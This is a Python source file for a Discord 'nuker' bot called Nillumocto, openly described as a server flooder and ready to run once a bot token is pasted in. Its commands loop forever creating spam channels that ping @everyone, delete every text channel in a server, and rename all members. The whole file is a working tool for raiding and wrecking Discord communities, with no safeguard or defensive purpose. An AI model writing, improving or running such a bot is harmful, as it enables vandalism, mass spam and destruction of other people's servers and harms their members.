#by kamushy
#read github description 
import discord
from discord.ext import commands

client = commands.Bot(command_prefix=".")

#read github description 
servernickname = "Enter what you want to re name server here"

@client.command()
async def octo(ctx):
    guild = ctx.guild
    username = ctx.message.author.name
    
    #Enter file path in the ''
    await ctx.send(file=discord.File(r'enter you file path here'))
    while 1 == 1:
        channel = await guild.create_text_channel(f"flooded-by, {username}")

        em = discord.Embed(title = "Nillumocto", description = "\n", color=0x0ff41)
        em.add_field(name="https://github.com/Kamushy/nillumocto-discord-flooder", value="Coded by kamushy" )
        await channel.send(embed = em)
        await channel.send("@everyone")

#dont need to change this
@client.command()
async def delete(ctx):
    await ctx.reply("Channels deleting now, as you wish")
    guild = ctx.guild
    for channel in guild.text_channels:
        await channel.delete()
                
@client.command()
async def rename(ctx):
    
    guild = ctx.guild
    await ctx.reply("Renaming all memembers")
    for person in guild.members:
        
        if person == ctx.guild.owner:
            print("Cant change since its the guild owner")
        try:     
            await person.edit(nick=servernickname)
        except:
            print(F"{person} username could not be changed try giving the bot a higher role")

#Add token here, read github description if confused
client.run('add your token here')
